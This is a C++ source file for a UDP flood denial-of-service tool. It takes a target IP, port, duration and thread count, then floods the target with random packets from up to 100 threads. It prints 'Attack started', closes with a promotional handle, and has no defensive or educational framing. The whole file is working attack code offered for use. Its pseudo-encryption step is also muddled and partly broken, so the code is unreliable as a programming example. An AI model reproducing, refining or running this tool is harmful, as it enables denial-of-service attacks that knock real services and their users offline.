#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#include <random>
#include <thread>
#include <atomic>
#include <chrono>
#include <openssl/aes.h>

#define PAYLOAD_SIZE 20
#define MAX_THREADS 100

std::atomic<bool> stop_attack(false);

// Utility functions for input validation
bool is_valid_ip(const std::string& ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
}

bool is_valid_port(int port) {
    return port > 0 && port <= 65535;
}

bool is_valid_duration(int duration) {
    return duration > 0;
}

// Signal handling function
void handle_signal(int sig) {
    std::cout << "\nStopping attack gracefully...\n";
    stop_attack = true;
}

// Payload generation using random data
void generate_payload(char *buffer, size_t size) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dist(0, 15);

    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = "0123456789abcdef"[dist(gen)];
        buffer[i * 4 + 3] = "0123456789abcdef"[dist(gen)];
    }
    buffer[size * 4] = '\0';
}

// AES encryption function for payload
void encrypt_payload(char* payload, size_t size) {
    AES_KEY aes_key;
    unsigned char key[16] = {0};  // Simple key (should be securely generated)
    AES_set_encrypt_key(key, 128, &aes_key);
    unsigned char encrypted_payload[PAYLOAD_SIZE * 4 + 1];
    
    AES_encrypt((unsigned char*)payload, encrypted_payload, &aes_key);
    memcpy(payload, encrypted_payload, size);  // Replace original payload with encrypted one
}

// Attack class to manage the attack logic
class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {}

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        char payload[PAYLOAD_SIZE * 4 + 1];
        generate_payload(payload, PAYLOAD_SIZE);
        encrypt_payload(payload, PAYLOAD_SIZE * 4 + 1);  // Encrypt the payload

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            std::cerr << "Socket creation failed\n";
            return;
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        auto start = std::chrono::steady_clock::now();
        auto endtime = start + std::chrono::seconds(duration);
        while (std::chrono::steady_clock::now() <= endtime) {
            ssize_t payload_size = strlen(payload);
            if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                std::cerr << "Send failed\n";
                close(sock);
                return;
            }
        }

        close(sock);
    }

private:
    std::string ip;
    int port;
    int duration;
};

// Main program entry point
void usage() {
    std::cout << "Usage: ./1234 <ip> <port> <duration> <threads>\n";
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);

    // Validate input
    if (!is_valid_ip(ip)) {
        std::cerr << "Invalid IP address format.\n";
        exit(1);
    }
    if (!is_valid_port(port)) {
        std::cerr << "Port must be between 1 and 65535.\n";
        exit(1);
    }
    if (!is_valid_duration(duration)) {
        std::cerr << "Duration must be a positive number.\n";
        exit(1);
    }
    if (threads > MAX_THREADS) {
        std::cerr << "Too many threads requested. Maximum allowed is " << MAX_THREADS << ".\n";
        exit(1);
    }

    // Set up signal handler for graceful shutdown
    std::signal(SIGINT, handle_signal);

    std::vector<std::thread> thread_pool;
    std::cout << "Attack started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads\n";

    // Launch threads for the attack
    for (int i = 0; i < threads; i++) {
        auto attack = std::make_shared<Attack>(ip, port, duration);
        thread_pool.push_back(std::thread([attack]() {
            while (!stop_attack) {
                attack->attack_thread();
            }
        }));
    }

    // Wait for threads to finish
    for (auto& t : thread_pool) {
        if (t.joinable()) {
            t.join();
        }
    }

    std::cout << "Attack finished. Join @GODxAloneBOY\n";
    return 0;
}